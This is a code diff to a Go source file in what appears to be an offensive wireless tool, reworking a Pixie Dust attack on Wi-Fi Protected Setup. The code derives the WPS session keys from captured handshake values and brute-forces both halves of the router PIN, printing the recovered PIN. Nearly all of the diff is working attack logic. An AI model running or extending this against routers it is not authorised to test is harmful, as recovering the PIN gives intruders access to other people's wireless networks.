@@ -27,6 +27,7 @@ import (
 	"math/big"
 	"net"
 	"offscan/internal/utils"
+	"os"
 	"slices"
 	"time"
 )
@@ -34,8 +35,10 @@ import (
 
 
 type pixieDustAttack struct {
-    firstHalf   []byte
-    secondHalf  []byte
+    timeExec    time.Time
+    firstHalf   int
+    secondHalf  int
+    emptyPin    bool
 	jobs        int
 	pke         []byte
 	pkr         []byte
@@ -56,15 +59,20 @@ type pixieDustAttack struct {
 	cEnd        int
     emsk        []byte
     wrapKey     []byte
+    psk1        []byte
+    psk2        []byte
+    emptyPsk    []byte
+    kdk         []byte
+    decrypted5  []byte
+    decrypted7  []byte
     eSecret1    []byte
     eSecret2    []byte
-    psk1        []byte
 }
 
 
 
 func newPixieDust(args []string) pixieDustAttack {
-	pda := pixieDustAttack{}
+	pda := pixieDustAttack{ firstHalf: -1, secondHalf: -1}
 	pda.parsePortScanArgs(args)
 	return pda
 }
@@ -72,9 +80,18 @@ func newPixieDust(args []string) pixieDustAttack {
 
 
 func (pda *pixieDustAttack) execute() {
-	timeStart := time.Now()
+	pda.timeExec = time.Now()
     pda.executeRTL819xCase()
-	displayTime(timeStart)
+    pda.displayTime()
+}
+
+
+
+func (pda *pixieDustAttack) getKDK() {
+    dhKey  := computeDHKey(pda.pkr)
+	h      := hmac.New(sha256.New, dhKey)
+	h.Write(append(append(pda.eNonce, pda.ebssid...), pda.rNonce...))
+	pda.kdk = h.Sum(nil)
 }
 
 
@@ -84,11 +101,11 @@ func computeDHKey(pkr []byte) []byte {
 	
     sharedSecret, err := cryptoModExp(pkr, eKey, dhGroup5Prime)
     if err != nil {
-        return nil, err
+        utils.Abort(fmt.Sprintf("%v", err))
     }
 
     dhkey := sha256.Sum256(sharedSecret)
-    return dhkey[:], nil
+    return dhkey[:]
 }
 
 
@@ -115,14 +132,14 @@ func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
 
 
 
-func (pda *pixieDustAttack) keyDerivationFunction(key []byte) {
+func (pda *pixieDustAttack) keyDerivationFunction() {
 	var kdfSalt  = []byte("Wi-Fi Easy and Secure Key Derivation")
     totalLen    := wpsAuthkeyLen + wpsKeywrapkeyLen + wpsEmskLen // 80 bytes
     kdkBits     := uint32(totalLen * 8)  // 640 bits
     out         := make([]byte, 0, totalLen)
    
     for i := 1; len(out) < totalLen; i++ {
-        h := hmac.New(sha256.New, key)
+        h := hmac.New(sha256.New, pda.kdk)
         binary.Write(h, binary.BigEndian, uint32(i))
         h.Write(kdfSalt)
         binary.Write(h, binary.BigEndian, kdkBits)
@@ -143,57 +160,9 @@ func (pda *pixieDustAttack) keyDerivationFunction(key []byte) {
 
 
 
-func (pda *pixieDustAttack) emptyPinHMAC() []byte {
+func (pda *pixieDustAttack) emptyPinHMAC() {
     h := hmac.New(sha256.New, pda.authKey)
-    return h.Sum(nil)
-}
-
-
-
-func glibcFastSeed(seed uint32) uint32 {
-    var word0 uint32 = 0
-
-    // PWPS_UNERRING:
-    // if seed == 0x7fffffff { seed = 0x13f835f3 }
-    // if seed == 0xfffffffe { seed = 0x5df735f1 }
-
-    for j := 3; j < 31+3-1; j++ {
-        word0 += seed * glibcSeedTbl[j]
-
-        p    := uint64(16807) * uint64(seed)
-        p     = (p >> 31) + (p & 0x7fffffff)
-        seed  = uint32((p >> 31) + (p & 0x7fffffff))
-        // PWPS_UNERRING:
-        // if seed == 0x7fffffff { seed = 0 }
-    }
-
-    word0 += seed * glibcSeedTbl[33]
-    return word0 >> 1
-}
-
-
-
-func glibcFastNonce(seed uint32) []byte {
-    var word0, word1, word2, word3 uint32
-
-    for j := 0; j < 31; j++ {
-        word0 += seed * glibcSeedTbl[j+3]
-        word1 += seed * glibcSeedTbl[j+2]
-        word2 += seed * glibcSeedTbl[j+1]
-        word3 += seed * glibcSeedTbl[j+0]
-
-        p    := uint64(16807) * uint64(seed)
-        p     = (p >> 31) + (p & 0x7fffffff)
-        seed  = uint32((p >> 31) + (p & 0x7fffffff))
-    }
-
-    nonce := make([]byte, 16)
-    binary.BigEndian.PutUint32(nonce[0:4], word0>>1)
-    binary.BigEndian.PutUint32(nonce[4:8], word1>>1)
-    binary.BigEndian.PutUint32(nonce[8:12], word2>>1)
-    binary.BigEndian.PutUint32(nonce[12:16], word3>>1)
-    
-	return nonce
+    pda.emptyPsk = h.Sum(nil)
 }
 
 
@@ -202,31 +171,24 @@ func (pda *pixieDustAttack) crackFirstHalf(es1Override []byte) {
     eS1 := utils.Pick(es1Override != nil, es1Override, pda.eSecret1)
 
     if pda.checkEmptyPinHalf(eS1, pda.eHash1) {
-        pda.firstHalf = []byte{}
+        pda.emptyPin  = true
+        pda.firstHalf = 0
+        pda.psk1      = make([]byte, len(pda.emptyPsk))
+        copy(pda.psk1, pda.emptyPsk)
         return
     }
 
-    for half1 := 0; half1 < 10000; half1++ {
-        firstHalf := intToPinHalf(half1)
+    for firstHalf := range 10000 {
         psk, ok := pda.checkPinHalf(eS1, pda.eHash1, firstHalf)
-
-		if ok {
+        
+        if ok {
             pda.firstHalf = firstHalf
-            pda.psk1      = psk
+            pda.psk1      = append([]byte(nil), psk...)
             return
         }
     }
-}
 
-
-
-func intToPinHalf(n int) []byte {
-    var buf [4]byte
-    buf[0] = byte('0' + (n/1000)%10)
-    buf[1] = byte('0' + (n/100)%10)
-    buf[2] = byte('0' + (n/10)%10)
-    buf[3] = byte('0' + n%10)
-    return buf[:]
+    pda.firstHalf = -1
 }
 
 
@@ -234,7 +196,7 @@ func intToPinHalf(n int) []byte {
 func (pda *pixieDustAttack) checkEmptyPinHalf(es, ehash []byte) bool {
     h := hmac.New(sha256.New, pda.authKey)
     h.Write(es)
-    h.Write(ehash)
+    h.Write(pda.emptyPsk[:16])
     h.Write(pda.pke)
     h.Write(pda.pkr)
     hash := h.Sum(nil)
@@ -243,10 +205,11 @@ func (pda *pixieDustAttack) checkEmptyPinHalf(es, ehash []byte) bool {
 
 
 
-func (pda *pixieDustAttack) checkPinHalf(es, ehash, pinhalf []byte) ([]byte, bool) {
-    h := hmac.New(sha256.New, pda.authKey)
-    h.Write(pinhalf)
-    psk := h.Sum(nil)
+func (pda *pixieDustAttack) checkPinHalf(es, ehash []byte, pinHalf int) ([]byte, bool) {
+    h       := hmac.New(sha256.New, pda.authKey)
+    pinhalf := intToPinHalf(pinHalf)
+    h.Write(pinhalf[:])
+    psk := h.Sum(nil)[:16]
 
     // buffer = es || psk || pke || pkr
     h.Reset()
@@ -257,6 +220,65 @@ func (pda *pixieDustAttack) checkPinHalf(es, ehash, pinhalf []byte) ([]byte, boo
     hash := h.Sum(nil)
 
     return psk, hmac.Equal(hash, ehash)
+}
+
+
+
+func intToPinHalf(n int) [4]byte {
+    var buf [4]byte
+    buf[0] = byte('0' + (n/1000)%10)
+    buf[1] = byte('0' + (n/100)%10)
+    buf[2] = byte('0' + (n/10)%10)
+    buf[3] = byte('0' + n%10)
+    return buf
+}
+
+
+
+func (pda *pixieDustAttack) crackSecondHalf() {
+    if pda.emptyPin {
+        if pda.checkEmptyPinHalf(pda.eSecret2, pda.eHash2) {
+            pda.secondHalf = 0
+            pda.psk2       = make([]byte, len(pda.emptyPsk))
+            copy(pda.psk2, pda.emptyPsk)
+            return
+        }
+        utils.Abort("Empty pin not valid for second half")
+    }
+
+    if pda.firstHalf < 0 || pda.firstHalf > 9999 {
+        utils.Abort(fmt.Sprintf("Invalid first half: %d", pda.firstHalf))
+    }
+
+    for secondHalf := range 1000{
+        checksum    := wpsPinChecksum(pda.firstHalf * 1000 + secondHalf)
+        cSecondHalf := secondHalf * 10 + checksum
+        psk, ok     := pda.checkPinHalf(pda.eSecret2, pda.eHash2, cSecondHalf)
+
+        if ok {
+            pda.secondHalf = cSecondHalf
+            pda.psk2       = make([]byte, len(psk))
+            copy(pda.psk2, psk)
+            return
+        }
+    }
+
+    // Fallback
+    for secondHalf := range 10000 {
+        pinFull := pda.firstHalf * 10000 + secondHalf
+        if wpsPinValid(pinFull) { continue }
+
+        psk, ok := pda.checkPinHalf(pda.eSecret2, pda.eHash2, secondHalf)
+
+        if ok {
+            pda.secondHalf = secondHalf
+            pda.psk2       = make([]byte, len(psk))
+            copy(pda.psk2, psk)
+            return
+        }
+    }
+
+    pda.secondHalf = -1
 }
 
 
@@ -275,130 +297,36 @@ func wpsPinChecksum(pin int) int {
 
 
 func wpsPinValid(pin int) bool {
-    return wpsPinChecksum(pin/10) == pin%10
+    return wpsPinChecksum(pin/10) == pin % 10
 }
 
 
 
-func uintToCharArray(num, length int) string {
-    return fmt.Sprintf("%0*d", length, num)
-}
-
-
-
-func crackSecondHalf(authkey, eS2, pke, pkr, eHash2, emptyPsk []byte, firstHalf int) (string, []byte, error) {
-    if firstHalf == 0 {
-        h := hmac.New(sha256.New, authkey)
-        h.Write(eS2)
-        h.Write(emptyPsk)
-        h.Write(pke)
-        h.Write(pkr)
-        if hmac.Equal(h.Sum(nil), eHash2) {
-            return "", emptyPsk, nil
-        }
-    }
-
-    for sh := 0; sh < 1000; sh++ {
-        checksum := wpsPinChecksum(firstHalf*1000 + sh)
-        secondHalfValue := sh*10 + checksum
-        sPin := uintToCharArray(secondHalfValue, 4)
-
-        ok, psk := checkPinHalf(authkey, eS2, pke, pkr, eHash2, sPin)
-        if ok {
-            pinFull := firstHalf*10000 + secondHalfValue
-            return fmt.Sprintf("%08d", pinFull), psk, nil
-        }
-    }
-
-    for sh := 0; sh < 10000; sh++ {
-        pinFull := firstHalf*10000 + sh
-        if wpsPinValid(pinFull) {
-            continue
-        }
-        sPin := uintToCharArray(sh, 4)
-        ok, psk := checkPinHalf(authkey, eS2, pke, pkr, eHash2, sPin)
-        if ok {
-            return fmt.Sprintf("%08d", pinFull), psk, nil
-        }
-    }
-
-    return "", nil, fmt.Errorf("second half not found")
-}
-
-
-
-func validateArgs(wps *WPS, start, end *int64) error {
-    // 1. Mutuamente exclusivos
-    if wps.PKR != nil && wps.SmallDHKeys {
-        return errors.New("--dh-small and --pkr are mutually exclusive")
-    }
-    // 2. Pelo menos um
-    if wps.PKR == nil && !wps.SmallDHKeys {
-        return errors.New("either --pkr or --dh-small must be specified")
-    }
-    // 3. Detecção automática
-    if wps.PKR != nil && checkSmallDHKeys(wps.PKR) {
-        wps.SmallDHKeys = true
-    }
-    // 4. Obrigatórios
-    if wps.PKE == nil || wps.EHash1 == nil || wps.EHash2 == nil || wps.ENonce == nil {
-        return errors.New("missing required arguments: --pke, --e-hash1, --e-hash2, --e-nonce")
-    }
-    if wps.AuthKey == nil {
-        if !wps.SmallDHKeys && !bytes.Equal(wps.PKE, wpsRtlPke) {
-            return errors.New("--authkey required when not using --dh-small or RTL819x PKE")
-        }
-        if wps.EBSSID == nil || wps.RNonce == nil {
-            return errors.New("--e-bssid and --r-nonce required when --authkey not provided")
-        }
-    }
-    // 5. --force com --start/--end
-    if wps.Bruteforce && (start != nil || end != nil) {
-        return errors.New("cannot specify --start or --end with --force")
-    }
-    return nil
-}
-
-
-
-func checkSmallDHKeys(data []byte) bool {
-    if len(data) != wpsPkeyLen {
-        return false
-    }
-    for i := 0; i < wpsPkeyLen - 1; i++ {
-        if data[i] != 0 {
-            return false
-        }
-    }
-    return data[wpsPkeyLen - 1] == 0x02
-}
-
-
-
-func getAutoModes(pke, eNonce []byte) []int {
-    modes := make([]int, 0, 4)
-
-    if pda.isRTL819xPKE() {
-        return []int{rtl819x}
-    }
-
-    modes = append(modes, rt)
-
-    if len(eNonce) >= 16 &&
-        eNonce[0] < 0x80 && eNonce[4] < 0x80 &&
-        eNonce[8] < 0x80 && eNonce[12] < 0x80 {
-        modes = append(modes, rtl819x)
-        modes = append(modes, eCosSimple)
-    } else {
-        modes = append(modes, eCosSimple)
-    }
-
-    return modes
-}
-
-
-
-func displayTime(timeStart time.Time) {
-	elapsed := time.Since(timeStart).Seconds()
+func (pda *pixieDustAttack) displayTime() {
+	elapsed := time.Since(pda.timeExec).Seconds()
     fmt.Printf("[%%] %.2f seconds in execution\n", elapsed)
+}
+
+
+
+func (pda *pixieDustAttack) displayPIN() {
+    if pda.firstHalf == -1 && pda.secondHalf == -1 {
+        fmt.Println("[!] PIN not found")
+        return
+    }
+
+    if pda.emptyPin {
+        fmt.Println("[*] Empty PIN")
+        return
+    }
+
+    pin := utils.Pick(pda.firstHalf > -1,  fmt.Sprintf("%d", pda.firstHalf),  "????")
+    pin += utils.Pick(pda.secondHalf > -1, fmt.Sprintf("%d", pda.secondHalf), "????")
+
+    if pda.firstHalf != -1 && pda.secondHalf == -1 {
+        fmt.Println("[!] Only the first half was found")
+    }
+
+    fmt.Printf("[*] PIN: %s", pin)
+    os.Exit(0)
 }
